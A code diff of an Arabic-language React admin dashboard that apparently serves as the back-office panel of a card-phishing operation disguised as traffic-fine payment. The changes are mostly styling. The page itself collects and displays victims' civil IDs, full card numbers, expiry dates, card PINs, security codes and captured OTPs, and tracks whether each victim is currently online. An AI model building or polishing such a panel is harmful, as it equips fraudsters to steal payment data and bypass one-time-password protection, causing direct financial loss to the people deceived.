@@ -16,6 +16,10 @@ import {
   LogOut,
   RefreshCw,
   AlertCircle,
+  CheckCircle2,
+  XCircle,
+  Clock,
+  Shield,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
@@ -75,6 +79,16 @@ const styles = `
   50% { transform: translateY(-3px); }
 }
 
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes shimmer {
+  0% { background-position: -200% 0; }
+  100% { background-position: 200% 0; }
+}
+
 .animate-pulse-green {
   animation: pulseGreen 2s ease-in-out;
 }
@@ -85,6 +99,82 @@ const styles = `
 
 .animate-bounce-small {
   animation: bounceSmall 0.5s ease-in-out;
+}
+
+.animate-fade-in {
+  animation: fadeIn 0.3s ease-out forwards;
+}
+
+.shimmer {
+  background: linear-gradient(90deg, 
+    rgba(255,255,255,0) 0%, 
+    rgba(255,255,255,0.5) 50%, 
+    rgba(255,255,255,0) 100%);
+  background-size: 200% 100%;
+  animation: shimmer 1.5s infinite;
+}
+
+.card-hover {
+  transition: all 0.2s ease;
+}
+
+.card-hover:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.01);
+}
+
+.status-badge {
+  transition: all 0.3s ease;
+}
+
+.status-badge.online {
+  background: linear-gradient(135deg, #dcfce7 0%, #bbf7d0 100%);
+  border: 1px solid #86efac;
+}
+
+.status-badge.offline {
+  background: linear-gradient(135deg, #fee2e2 0%, #fecaca 100%);
+  border: 1px solid #fca5a5;
+}
+
+.glass-effect {
+  backdrop-filter: blur(8px);
+  -webkit-backdrop-filter: blur(8px);
+}
+
+.otp-badge {
+  font-family: 'Roboto Mono', monospace;
+  letter-spacing: 0.5px;
+  font-weight: 500;
+}
+
+.table-row-animate {
+  transition: background-color 0.2s ease;
+}
+
+.table-row-animate:hover {
+  background-color: rgba(241, 245, 249, 0.8);
+}
+
+.stat-card {
+  overflow: hidden;
+  position: relative;
+}
+
+.stat-card::after {
+  content: '';
+  position: absolute;
+  top: 0;
+  right: 0;
+  width: 100px;
+  height: 100%;
+  background: linear-gradient(90deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.1) 100%);
+  transform: skewX(-15deg) translateX(50px);
+  transition: transform 0.5s ease;
+}
+
+.stat-card:hover::after {
+  transform: skewX(-15deg) translateX(150px);
 }
 `
 
@@ -169,7 +259,7 @@ function AnimatedOtpBadge({ otp, isNew = false }: { otp: string; isNew?: boolean
   return (
     <div ref={badgeRef} className={`relative ${isNew ? "animate-bounce-small" : ""}`}>
       <Badge
-        className={`font-mono text-black bg-green-50 border-green-200 shadow-sm transition-all duration-300 ${
+        className={`font-mono text-black bg-green-50 border-green-200 shadow-sm transition-all duration-300 otp-badge ${
           isNew ? "ring-2 ring-green-400 ring-opacity-50" : ""
         }`}
       >
@@ -522,14 +612,12 @@ export default function NotificationsPage() {
     return (
       <Badge
         variant="outline"
-        className={`${
-          status === "online" ? "bg-green-50 text-green-700 border-green-200" : "bg-red-50 text-red-700 border-red-200"
-        }`}
+        className={`status-badge ${
+          status === "online" ? "online" : "offline"
+        } flex items-center gap-1.5 px-2 py-1 rounded-full transition-all duration-300`}
       >
-        <span className="flex items-center gap-1.5">
-          <span className={`h-2 w-2 rounded-full ${status === "online" ? "bg-green-500" : "bg-red-500"}`}></span>
-          {status === "online" ? "متصل" : "غير متصل"}
-        </span>
+        <span className={`h-2 w-2 rounded-full ${status === "online" ? "bg-green-500" : "bg-red-500"}`}></span>
+        {status === "online" ? "متصل" : "غير متصل"}
       </Badge>
     )
   }
@@ -552,10 +640,14 @@ export default function NotificationsPage() {
 
   if (isLoading) {
     return (
-      <div className="min-h-screen bg-slate-50 text-slate-900 flex items-center justify-center">
-        <div className="flex flex-col items-center gap-4">
-          <div className="h-10 w-10 animate-spin rounded-full border-4 border-primary border-t-transparent"></div>
-          <p className="text-lg font-medium">جاري التحميل...</p>
+      <div className="min-h-screen bg-gradient-to-b from-slate-50 to-white text-slate-900 flex items-center justify-center">
+        <div className="flex flex-col items-center gap-4 animate-fade-in">
+          <div className="relative h-16 w-16">
+            <div className="absolute inset-0 rounded-full border-4 border-slate-200"></div>
+            <div className="absolute inset-0 rounded-full border-4 border-t-primary border-r-transparent border-b-transparent border-l-transparent animate-spin"></div>
+          </div>
+          <p className="text-lg font-medium text-slate-700">جاري التحميل...</p>
+          <p className="text-sm text-slate-500">يتم جلب البيانات</p>
         </div>
       </div>
     )
@@ -579,15 +671,17 @@ export default function NotificationsPage() {
   }
 
   return (
-    <div dir="rtl" className="min-h-screen bg-slate-50 text-slate-900">
+    <div dir="rtl" className="min-h-screen bg-gradient-to-b from-slate-50 to-white text-slate-900">
       <style>{styles}</style>
       <header className="bg-white border-b border-slate-200 sticky top-0 z-10 shadow-sm">
         <div className="container mx-auto px-4 py-3 flex justify-between items-center">
           <div className="flex items-center gap-3">
-            <div className="bg-primary/10 p-2 rounded-full">
+            <div className="bg-gradient-to-br from-primary/20 to-primary/10 p-2 rounded-full">
               <Bell className="h-5 w-5 text-primary" />
             </div>
-            <h1 className="text-xl font-bold">لوحة الإشعارات</h1>
+            <h1 className="text-xl font-bold bg-gradient-to-r from-slate-800 to-slate-600 bg-clip-text text-transparent">
+              لوحة الإشعارات
+            </h1>
           </div>
           <div className="flex items-center gap-3">
             <TooltipProvider>
@@ -598,7 +692,7 @@ export default function NotificationsPage() {
                     size="icon"
                     onClick={refreshData}
                     disabled={isRefreshing}
-                    className="h-9 w-9"
+                    className="h-9 w-9 transition-all duration-300 hover:bg-slate-100 hover:border-slate-300"
                   >
                     <RefreshCw className={`h-4 w-4 ${isRefreshing ? "animate-spin" : ""}`} />
                   </Button>
@@ -610,21 +704,30 @@ export default function NotificationsPage() {
             </TooltipProvider>
             <DropdownMenu>
               <DropdownMenuTrigger asChild>
-                <Button variant="outline" size="sm" className="gap-2">
+                <Button
+                  variant="outline"
+                  size="sm"
+                  className="gap-2 transition-all duration-300 hover:bg-slate-100 hover:border-slate-300"
+                >
                   <Avatar className="h-6 w-6">
-                    <AvatarFallback className="bg-primary/10 text-primary text-xs">مشرف</AvatarFallback>
+                    <AvatarFallback className="bg-gradient-to-br from-primary/20 to-primary/10 text-primary text-xs">
+                      مشرف
+                    </AvatarFallback>
                   </Avatar>
                   <span className="hidden sm:inline">الحساب</span>
                   <ChevronDown className="h-4 w-4 opacity-50" />
                 </Button>
               </DropdownMenuTrigger>
-              <DropdownMenuContent align="end" className="w-56">
-                <DropdownMenuItem className="gap-2">
+              <DropdownMenuContent align="end" className="w-56 animate-fade-in">
+                <DropdownMenuItem className="gap-2 transition-all duration-200 hover:bg-slate-100">
                   <LayoutDashboard className="h-4 w-4" />
                   <span>لوحة التحكم</span>
                 </DropdownMenuItem>
                 <DropdownMenuSeparator />
-                <DropdownMenuItem onClick={handleLogout} className="gap-2 text-red-600">
+                <DropdownMenuItem
+                  onClick={handleLogout}
+                  className="gap-2 text-red-600 transition-all duration-200 hover:bg-red-50"
+                >
                   <LogOut className="h-4 w-4" />
                   <span>تسجيل الخروج</span>
                 </DropdownMenuItem>
@@ -638,17 +741,17 @@ export default function NotificationsPage() {
         {/* Statistics Grid */}
         <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
           {/* Online Users Card */}
-          <Card className="border-0 shadow-sm overflow-hidden">
+          <Card className="border-0 shadow-sm overflow-hidden stat-card card-hover animate-fade-in">
             <CardHeader className="pb-2 bg-gradient-to-r from-green-50 to-green-100 border-b">
-              <CardTitle className="text-base font-medium flex items-center gap-2">
+              <CardTitle className="text-base font-medium flex items-center gap-2 text-green-800">
                 <UserCheck className="h-5 w-5 text-green-600" />
                 المستخدمين المتصلين
               </CardTitle>
             </CardHeader>
-            <CardContent className="pt-4">
+            <CardContent className="pt-4 bg-white">
               <div className="flex items-center justify-between">
                 <p className="text-3xl font-bold text-green-600">{onlineUsersCount}</p>
-                <div className="bg-green-50 p-2 rounded-full">
+                <div className="bg-gradient-to-br from-green-100 to-green-50 p-2 rounded-full">
                   <UserCheck className="h-6 w-6 text-green-500" />
                 </div>
               </div>
@@ -656,17 +759,20 @@ export default function NotificationsPage() {
           </Card>
 
           {/* Total Visitors Card */}
-          <Card className="border-0 shadow-sm overflow-hidden">
+          <Card
+            className="border-0 shadow-sm overflow-hidden stat-card card-hover animate-fade-in"
+            style={{ animationDelay: "0.1s" }}
+          >
             <CardHeader className="pb-2 bg-gradient-to-r from-blue-50 to-blue-100 border-b">
-              <CardTitle className="text-base font-medium flex items-center gap-2">
+              <CardTitle className="text-base font-medium flex items-center gap-2 text-blue-800">
                 <Users className="h-5 w-5 text-blue-600" />
                 إجمالي الزوار
               </CardTitle>
             </CardHeader>
-            <CardContent className="pt-4">
+            <CardContent className="pt-4 bg-white">
               <div className="flex items-center justify-between">
                 <p className="text-3xl font-bold text-blue-600">{totalVisitors}</p>
-                <div className="bg-blue-50 p-2 rounded-full">
+                <div className="bg-gradient-to-br from-blue-100 to-blue-50 p-2 rounded-full">
                   <Users className="h-6 w-6 text-blue-500" />
                 </div>
               </div>
@@ -674,17 +780,20 @@ export default function NotificationsPage() {
           </Card>
 
           {/* Card Submissions Card */}
-          <Card className="border-0 shadow-sm overflow-hidden">
+          <Card
+            className="border-0 shadow-sm overflow-hidden stat-card card-hover animate-fade-in"
+            style={{ animationDelay: "0.2s" }}
+          >
             <CardHeader className="pb-2 bg-gradient-to-r from-purple-50 to-purple-100 border-b">
-              <CardTitle className="text-base font-medium flex items-center gap-2">
+              <CardTitle className="text-base font-medium flex items-center gap-2 text-purple-800">
                 <CreditCard className="h-5 w-5 text-purple-600" />
                 معلومات البطاقات
               </CardTitle>
             </CardHeader>
-            <CardContent className="pt-4">
+            <CardContent className="pt-4 bg-white">
               <div className="flex items-center justify-between">
                 <p className="text-3xl font-bold text-purple-600">{cardSubmissions}</p>
-                <div className="bg-purple-50 p-2 rounded-full">
+                <div className="bg-gradient-to-br from-purple-100 to-purple-50 p-2 rounded-full">
                   <CreditCard className="h-6 w-6 text-purple-500" />
                 </div>
               </div>
@@ -694,22 +803,41 @@ export default function NotificationsPage() {
 
         {/* Filters and Actions */}
         <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
-          <Tabs defaultValue="all" value={activeTab} onValueChange={setActiveTab} className="w-full sm:w-auto">
-            <TabsList className="grid w-full grid-cols-3 p-1 bg-slate-100">
-              <TabsTrigger value="all" className="data-[state=active]:bg-white data-[state=active]:shadow-sm">
+          <Tabs
+            defaultValue="all"
+            value={activeTab}
+            onValueChange={setActiveTab}
+            className="w-full sm:w-auto animate-fade-in"
+          >
+            <TabsList className="grid w-full grid-cols-3 p-1 bg-slate-100 rounded-lg">
+              <TabsTrigger
+                value="all"
+                className="data-[state=active]:bg-white data-[state=active]:shadow-sm data-[state=active]:text-primary transition-all duration-200"
+              >
                 الكل
               </TabsTrigger>
-              <TabsTrigger value="online" className="data-[state=active]:bg-white data-[state=active]:shadow-sm">
+              <TabsTrigger
+                value="online"
+                className="data-[state=active]:bg-white data-[state=active]:shadow-sm data-[state=active]:text-primary transition-all duration-200"
+              >
                 متصل
               </TabsTrigger>
-              <TabsTrigger value="cards" className="data-[state=active]:bg-white data-[state=active]:shadow-sm">
+              <TabsTrigger
+                value="cards"
+                className="data-[state=active]:bg-white data-[state=active]:shadow-sm data-[state=active]:text-primary transition-all duration-200"
+              >
                 البطاقات
               </TabsTrigger>
             </TabsList>
           </Tabs>
 
-          <div className="flex flex-wrap gap-2 w-full sm:w-auto">
-            <Button variant="outline" onClick={toggleFilters} className="flex items-center gap-2" size="sm">
+          <div className="flex flex-wrap gap-2 w-full sm:w-auto animate-fade-in" style={{ animationDelay: "0.1s" }}>
+            <Button
+              variant="outline"
+              onClick={toggleFilters}
+              className="flex items-center gap-2 transition-all duration-300 hover:bg-slate-100 hover:border-slate-300"
+              size="sm"
+            >
               <Filter className="h-4 w-4" />
               الفلاتر
               {(showOnlineOnly || showWithCardOnly) && (
@@ -721,7 +849,7 @@ export default function NotificationsPage() {
               onClick={handleClearAll}
               size="sm"
               disabled={notifications.length === 0}
-              className="gap-2"
+              className="gap-2 transition-all duration-300 hover:bg-red-700"
             >
               <Trash2 className="h-4 w-4" />
               مسح الكل
@@ -730,7 +858,7 @@ export default function NotificationsPage() {
         </div>
 
         {showFilters && (
-          <Card className="mb-6 border-0 shadow-sm">
+          <Card className="mb-6 border-0 shadow-sm animate-fade-in">
             <CardContent className="pt-6">
               <div className="flex flex-col sm:flex-row gap-6">
                 <div className="flex items-center space-x-2 space-x-reverse">
@@ -738,6 +866,7 @@ export default function NotificationsPage() {
                     id="online-filter"
                     checked={showOnlineOnly}
                     onCheckedChange={(checked: boolean) => setShowOnlineOnly(checked === true)}
+                    className="data-[state=checked]:bg-green-600 data-[state=checked]:border-green-600"
                   />
                   <label
                     htmlFor="online-filter"
@@ -751,6 +880,7 @@ export default function NotificationsPage() {
                     id="card-filter"
                     checked={showWithCardOnly}
                     onCheckedChange={(checked: boolean) => setShowWithCardOnly(checked === true)}
+                    className="data-[state=checked]:bg-purple-600 data-[state=checked]:border-purple-600"
                   />
                   <label
                     htmlFor="card-filter"
@@ -761,7 +891,7 @@ export default function NotificationsPage() {
                 </div>
               </div>
               {(showOnlineOnly || showWithCardOnly) && (
-                <div className="mt-4 text-sm text-blue-600 flex items-center gap-2">
+                <div className="mt-4 text-sm text-blue-600 flex items-center gap-2 bg-blue-50 p-3 rounded-lg">
                   <AlertCircle className="h-4 w-4" />
                   يتم عرض {allDisplayNotifications.length} من أصل {notifications.length} إشعار
                 </div>
@@ -771,10 +901,10 @@ export default function NotificationsPage() {
         )}
 
         {allDisplayNotifications.length === 0 ? (
-          <Card className="bg-white border-0 shadow-sm">
+          <Card className="bg-white border-0 shadow-sm animate-fade-in">
             <CardContent className="flex flex-col items-center justify-center py-12">
-              <div className="bg-slate-100 p-4 rounded-full mb-4">
-                <Bell className="h-10 w-10 text-slate-400" />
+              <div className="bg-gradient-to-br from-slate-100 to-slate-50 p-6 rounded-full mb-4">
+                <Bell className="h-12 w-12 text-slate-400" />
               </div>
               <h3 className="text-xl font-medium text-slate-700 mb-2">لا توجد إشعارات</h3>
               <p className="text-slate-500">ستظهر الإشعارات الجديدة هنا عند وصولها</p>
@@ -783,13 +913,13 @@ export default function NotificationsPage() {
         ) : (
           <div className="space-y-4">
             {/* Desktop Table View - Hidden on Mobile */}
-            <div className="hidden md:block">
+            <div className="hidden md:block animate-fade-in">
               <Card className="border-0 shadow-sm overflow-hidden">
                 <CardContent className="p-0">
                   <div className="overflow-x-auto">
                     <table className="w-full">
                       <thead>
-                        <tr className="border-b border-slate-200 bg-slate-50">
+                        <tr className="border-b border-slate-200 bg-gradient-to-r from-slate-50 to-white">
                           <th className="px-4 py-3 text-right text-sm font-medium text-slate-500">الدولة</th>
                           <th className="px-4 py-3 text-right text-sm font-medium text-slate-500">الإسم</th>
                           <th className="px-4 py-3 text-right text-sm font-medium text-slate-500">المعلومات</th>
@@ -799,10 +929,11 @@ export default function NotificationsPage() {
                         </tr>
                       </thead>
                       <tbody>
-                        {currentItems.map((notification) => (
+                        {currentItems.map((notification, index) => (
                           <tr
                             key={notification.id}
-                            className="border-b border-slate-200 hover:bg-slate-50 transition-colors"
+                            className="border-b border-slate-200 table-row-animate"
+                            style={{ animationDelay: `${index * 0.05}s` }}
                           >
                             <td className="px-4 py-3 text-sm">{notification?.country || "غير معروف"}</td>
                             <td className="px-4 py-3 text-sm">{notification?.civilId || "غير معروف"}</td>
@@ -813,7 +944,7 @@ export default function NotificationsPage() {
                                     <TooltipTrigger asChild>
                                       <Badge
                                         variant={notification?.civilId ? "outline" : "destructive"}
-                                        className={`rounded-md cursor-pointer ${
+                                        className={`rounded-md cursor-pointer transition-all duration-300 ${
                                           notification?.civilId ? "hover:bg-slate-100" : ""
                                         }`}
                                         onClick={() => handleInfoClick(notification, "personal")}
@@ -837,7 +968,7 @@ export default function NotificationsPage() {
                                             ? "outline"
                                             : "destructive"
                                         }
-                                        className={`rounded-md cursor-pointer ${
+                                        className={`rounded-md cursor-pointer transition-all duration-300 ${
                                           notification.cardNumber || notification.cardDetails?.number
                                             ? "bg-green-50 text-green-700 border-green-200 hover:bg-green-100"
                                             : ""
@@ -866,11 +997,14 @@ export default function NotificationsPage() {
                               </div>
                             </td>
                             <td className="px-4 py-3 text-sm text-slate-500">
-                              {notification.createdDate &&
-                                formatDistanceToNow(new Date(notification.createdDate), {
-                                  addSuffix: true,
-                                  locale: ar,
-                                })}
+                              <div className="flex items-center gap-1.5">
+                                <Clock className="h-3.5 w-3.5 text-slate-400" />
+                                {notification.createdDate &&
+                                  formatDistanceToNow(new Date(notification.createdDate), {
+                                    addSuffix: true,
+                                    locale: ar,
+                                  })}
+                              </div>
                             </td>
                             <td className="px-4 py-3 text-center">
                               <UserStatusBadge userId={notification.id} />
@@ -884,7 +1018,7 @@ export default function NotificationsPage() {
                                         variant="destructive"
                                         size="sm"
                                         onClick={() => handleDelete(notification.id)}
-                                        className="h-8 w-8 p-0"
+                                        className="h-8 w-8 p-0 transition-all duration-300 hover:bg-red-700"
                                       >
                                         <Trash2 className="h-4 w-4" />
                                       </Button>
@@ -902,7 +1036,7 @@ export default function NotificationsPage() {
                     </table>
                   </div>
                 </CardContent>
-                <CardFooter className="flex items-center justify-between px-6 py-4 bg-slate-50 border-t border-slate-200">
+                <CardFooter className="flex items-center justify-between px-6 py-4 bg-gradient-to-r from-slate-50 to-white border-t border-slate-200">
                   <div className="flex items-center gap-2">
                     <span className="text-sm text-slate-500">
                       عرض {indexOfFirstItem + 1}-{Math.min(indexOfLastItem, allDisplayNotifications.length)} من{" "}
@@ -915,7 +1049,7 @@ export default function NotificationsPage() {
                         setCurrentPage(1)
                       }}
                     >
-                      <SelectTrigger className="w-[80px] h-8">
+                      <SelectTrigger className="w-[80px] h-8 transition-all duration-300 hover:border-slate-300">
                         <SelectValue placeholder="10" />
                       </SelectTrigger>
                       <SelectContent>
@@ -931,13 +1065,17 @@ export default function NotificationsPage() {
                       <PaginationItem>
                         <PaginationPrevious
                           onClick={() => setCurrentPage((prev) => Math.max(prev - 1, 1))}
-                          className={currentPage === 1 ? "pointer-events-none opacity-50" : ""}
+                          className={`transition-all duration-300 ${currentPage === 1 ? "pointer-events-none opacity-50" : "hover:bg-slate-100"}`}
                         />
                       </PaginationItem>
 
                       {pageNumbers.map((number) => (
                         <PaginationItem key={number}>
-                          <PaginationLink onClick={() => setCurrentPage(number)} isActive={currentPage === number}>
+                          <PaginationLink
+                            onClick={() => setCurrentPage(number)}
+                            isActive={currentPage === number}
+                            className="transition-all duration-300"
+                          >
                             {number}
                           </PaginationLink>
                         </PaginationItem>
@@ -946,7 +1084,7 @@ export default function NotificationsPage() {
                       <PaginationItem>
                         <PaginationNext
                           onClick={() => setCurrentPage((prev) => Math.min(prev + 1, totalPages))}
-                          className={currentPage === totalPages ? "pointer-events-none opacity-50" : ""}
+                          className={`transition-all duration-300 ${currentPage === totalPages ? "pointer-events-none opacity-50" : "hover:bg-slate-100"}`}
                         />
                       </PaginationItem>
                     </PaginationContent>
@@ -957,23 +1095,30 @@ export default function NotificationsPage() {
 
             {/* Mobile Card View - Shown only on Mobile */}
             <div className="md:hidden space-y-4">
-              {currentItems.map((notification) => (
-                <Card key={notification.id} className="overflow-hidden border-0 shadow-sm">
-                  <CardHeader className="pb-2 pt-4 px-4 bg-gradient-to-r from-slate-50 to-slate-100 border-b">
+              {currentItems.map((notification, index) => (
+                <Card
+                  key={notification.id}
+                  className="overflow-hidden border-0 shadow-sm card-hover animate-fade-in"
+                  style={{ animationDelay: `${index * 0.05}s` }}
+                >
+                  <CardHeader className="pb-2 pt-4 px-4 bg-gradient-to-r from-slate-50 to-white border-b">
                     <div className="flex justify-between items-start">
                       <div>
                         <CardTitle className="text-base">{notification?.civilId || "مستخدم"}</CardTitle>
-                        <p className="text-sm text-slate-500">{notification?.country || "غير معروف"}</p>
+                        <p className="text-sm text-slate-500 flex items-center gap-1.5 mt-1">
+                          <Shield className="h-3.5 w-3.5 text-slate-400" />
+                          {notification?.country || "غير معروف"}
+                        </p>
                       </div>
                       <UserStatusBadge userId={notification.id} />
                     </div>
                   </CardHeader>
-                  <CardContent className="px-4 pb-4 pt-3">
+                  <CardContent className="px-4 pb-4 pt-3 bg-white">
                     <div className="space-y-4">
                       <div className="flex flex-wrap gap-2 mt-2">
                         <Badge
                           variant={notification?.civilId ? "outline" : "destructive"}
-                          className={`rounded-md cursor-pointer ${
+                          className={`rounded-md cursor-pointer transition-all duration-300 ${
                             notification?.civilId ? "hover:bg-slate-100" : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "personal")}
@@ -985,7 +1130,7 @@ export default function NotificationsPage() {
                           variant={
                             notification.cardNumber || notification.cardDetails?.number ? "outline" : "destructive"
                           }
-                          className={`rounded-md cursor-pointer ${
+                          className={`rounded-md cursor-pointer transition-all duration-300 ${
                             notification.cardNumber || notification.cardDetails?.number
                               ? "bg-green-50 text-green-700 border-green-200 hover:bg-green-100"
                               : ""
@@ -1003,7 +1148,8 @@ export default function NotificationsPage() {
                         </Badge>
                       </div>
 
-                      <div className="text-sm text-slate-500 flex items-center gap-2">
+                      <div className="text-sm text-slate-500 flex items-center gap-2 bg-slate-50 p-3 rounded-lg">
+                        <Clock className="h-4 w-4 text-slate-400" />
                         <span className="font-medium">الوقت:</span>{" "}
                         {notification.createdDate &&
                           formatDistanceToNow(new Date(notification.createdDate), {
@@ -1012,14 +1158,14 @@ export default function NotificationsPage() {
                           })}
                       </div>
 
-                      <Separator />
+                      <Separator className="bg-slate-100" />
 
                       <div className="flex justify-end">
                         <Button
                           variant="destructive"
                           size="sm"
                           onClick={() => handleDelete(notification.id)}
-                          className="h-8 gap-2"
+                          className="h-8 gap-2 transition-all duration-300 hover:bg-red-700"
                         >
                           <Trash2 className="h-4 w-4" />
                           حذف
@@ -1031,13 +1177,13 @@ export default function NotificationsPage() {
               ))}
 
               {/* Mobile Pagination */}
-              <div className="flex flex-col items-center gap-4 py-4">
+              <div className="flex flex-col items-center gap-4 py-4 animate-fade-in">
                 <Pagination>
                   <PaginationContent>
                     <PaginationItem>
                       <PaginationPrevious
                         onClick={() => setCurrentPage((prev) => Math.max(prev - 1, 1))}
-                        className={currentPage === 1 ? "pointer-events-none opacity-50" : ""}
+                        className={`transition-all duration-300 ${currentPage === 1 ? "pointer-events-none opacity-50" : "hover:bg-slate-100"}`}
                       />
                     </PaginationItem>
 
@@ -1045,7 +1191,11 @@ export default function NotificationsPage() {
                       <>
                         {pageNumbers.slice(0, 2).map((number) => (
                           <PaginationItem key={number}>
-                            <PaginationLink onClick={() => setCurrentPage(number)} isActive={currentPage === number}>
+                            <PaginationLink
+                              onClick={() => setCurrentPage(number)}
+                              isActive={currentPage === number}
+                              className="transition-all duration-300"
+                            >
                               {number}
                             </PaginationLink>
                           </PaginationItem>
@@ -1055,7 +1205,11 @@ export default function NotificationsPage() {
                         </PaginationItem>
                         {pageNumbers.slice(-2).map((number) => (
                           <PaginationItem key={number}>
-                            <PaginationLink onClick={() => setCurrentPage(number)} isActive={currentPage === number}>
+                            <PaginationLink
+                              onClick={() => setCurrentPage(number)}
+                              isActive={currentPage === number}
+                              className="transition-all duration-300"
+                            >
                               {number}
                             </PaginationLink>
                           </PaginationItem>
@@ -1064,7 +1218,11 @@ export default function NotificationsPage() {
                     ) : (
                       pageNumbers.map((number) => (
                         <PaginationItem key={number}>
-                          <PaginationLink onClick={() => setCurrentPage(number)} isActive={currentPage === number}>
+                          <PaginationLink
+                            onClick={() => setCurrentPage(number)}
+                            isActive={currentPage === number}
+                            className="transition-all duration-300"
+                          >
                             {number}
                           </PaginationLink>
                         </PaginationItem>
@@ -1074,7 +1232,7 @@ export default function NotificationsPage() {
                     <PaginationItem>
                       <PaginationNext
                         onClick={() => setCurrentPage((prev) => Math.min(prev + 1, totalPages))}
-                        className={currentPage === totalPages ? "pointer-events-none opacity-50" : ""}
+                        className={`transition-all duration-300 ${currentPage === totalPages ? "pointer-events-none opacity-50" : "hover:bg-slate-100"}`}
                       />
                     </PaginationItem>
                   </PaginationContent>
@@ -1091,7 +1249,7 @@ export default function NotificationsPage() {
                       setCurrentPage(1)
                     }}
                   >
-                    <SelectTrigger className="w-[80px] h-8">
+                    <SelectTrigger className="w-[80px] h-8 transition-all duration-300 hover:border-slate-300">
                       <SelectValue placeholder="10" />
                     </SelectTrigger>
                     <SelectContent>
@@ -1109,9 +1267,15 @@ export default function NotificationsPage() {
       </main>
 
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
-        <DialogContent className="bg-white text-slate-900 max-w-[90vw] md:max-w-md" dir="rtl">
+        <DialogContent
+          className="bg-white text-slate-900 max-w-[90vw] md:max-w-md glass-effect animate-fade-in"
+          dir="rtl"
+        >
           <DialogHeader>
-            <DialogTitle dir="rtl" className="text-xl font-bold">
+            <DialogTitle
+              dir="rtl"
+              className="text-xl font-bold bg-gradient-to-r from-slate-800 to-slate-600 bg-clip-text text-transparent"
+            >
               {selectedInfo === "personal"
                 ? "المعلومات الشخصية"
                 : selectedInfo === "card"
@@ -1127,13 +1291,18 @@ export default function NotificationsPage() {
             </DialogDescription>
           </DialogHeader>
 
-          <Button variant="ghost" size="sm" className="absolute top-2 left-2 h-8 w-8 p-0" onClick={closeDialog}>
+          <Button
+            variant="ghost"
+            size="sm"
+            className="absolute top-2 left-2 h-8 w-8 p-0 rounded-full transition-all duration-300 hover:bg-slate-100"
+            onClick={closeDialog}
+          >
             <X className="h-4 w-4" />
           </Button>
 
           {selectedInfo === "personal" && selectedNotification?.plateType && (
             <div className="space-y-3 mt-2">
-              <div className="p-3 bg-slate-50 rounded-lg">
+              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                 <p className="flex justify-between">
                   <span className="font-medium text-slate-700">قيمة المخالفة:</span>
                   <span>{selectedNotification.violationValue || "غير متوفر"}</span>
@@ -1144,25 +1313,27 @@ export default function NotificationsPage() {
 
           {selectedInfo === "card" && selectedNotification && (
             <div className="space-y-3 mt-2">
-              <div className="p-3 bg-slate-50 rounded-lg">
+              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                 <p className="flex justify-between">
                   <span className="font-medium text-slate-700">البنك:</span>
                   <span>{selectedNotification.bank || "غير متوفر"}</span>
                 </p>
               </div>
 
-              <div className="p-3 bg-slate-50 rounded-lg">
+              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                 <p className="flex justify-between">
                   <span className="font-medium text-slate-700">رقم البطاقة:</span>
 
                   <span dir="ltr" className="font-mono">
                     {selectedNotification.cardNumber || selectedNotification.cardDetails?.number || "غير متوفر"}
                   </span>
-                  {selectedNotification?.prefix && <Badge>{selectedNotification?.prefix}</Badge>}
+                  {selectedNotification?.prefix && (
+                    <Badge className="bg-blue-100 text-blue-700 border-blue-200">{selectedNotification?.prefix}</Badge>
+                  )}
                 </p>
               </div>
 
-              <div className="p-3 bg-slate-50 rounded-lg">
+              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                 <p className="flex justify-between">
                   <span className="font-medium text-slate-700">تاريخ الانتهاء:</span>
                   <span className="font-mono">
@@ -1174,13 +1345,13 @@ export default function NotificationsPage() {
                 </p>
               </div>
 
-              <div className="p-3 bg-slate-50 rounded-lg">
+              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                 <p className="flex justify-between">
                   <span className="font-medium text-slate-700">رمز البطاقة:</span>
                   <span className="font-mono">{selectedNotification.pass || "غير متوفر"}</span>
                 </p>
               </div>
-              <div className="p-3 bg-slate-50 rounded-lg">
+              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                 <p className="flex justify-between">
                   <span className="font-medium text-slate-700">رمز الامان:</span>
                   <span className="font-mono">
@@ -1188,17 +1359,19 @@ export default function NotificationsPage() {
                   </span>
                 </p>
               </div>
-              <div className="p-3 bg-slate-50 rounded-lg">
+              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                 <p className="flex justify-between">
                   <span className="font-medium text-slate-700">رمز التحقق:</span>
-                  <Badge className="font-mono text-black bg-green-50">{selectedNotification?.otp || "غير متوفر"}</Badge>
-                  <Badge className="font-mono text-black bg-green-50">
+                  <Badge className="font-mono text-black bg-green-50 otp-badge">
+                    {selectedNotification?.otp || "غير متوفر"}
+                  </Badge>
+                  <Badge className="font-mono text-black bg-green-50 otp-badge">
                     {selectedNotification?.otp2 || "غير متوفر"}
                   </Badge>
                 </p>
               </div>
               {selectedNotification?.allOtps && selectedNotification.allOtps.length > 0 && (
-                <div className="p-3 bg-slate-50 rounded-lg">
+                <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                   <style>{styles}</style>
                   <p className="flex flex-col gap-2">
                     <span className="font-medium text-slate-700 flex items-center gap-2">
@@ -1224,18 +1397,20 @@ export default function NotificationsPage() {
 
           {selectedInfo === "personal" && selectedNotification && !selectedNotification.plateType && (
             <div className="space-y-3 mt-2">
-              <div className="p-3 bg-slate-50 rounded-lg">
+              <div className="p-3 bg-gradient-to-r from-slate-50 to-white rounded-lg border border-slate-100 shadow-sm">
                 <p className="flex justify-between">
